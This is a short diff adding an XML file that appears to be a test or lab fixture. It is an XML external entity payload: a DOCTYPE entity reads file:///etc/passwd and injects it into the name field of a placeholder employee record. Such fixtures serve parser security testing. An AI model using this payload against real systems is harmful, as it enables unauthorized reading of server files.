@@ -1,0 +1,11 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
+]>
+<employee>
+    <name>&xxe;</name>
+    <id>9000123</id>
+    <dept>Finance</dept>
+    <email>alice@acme.lab</email>
+</employee>
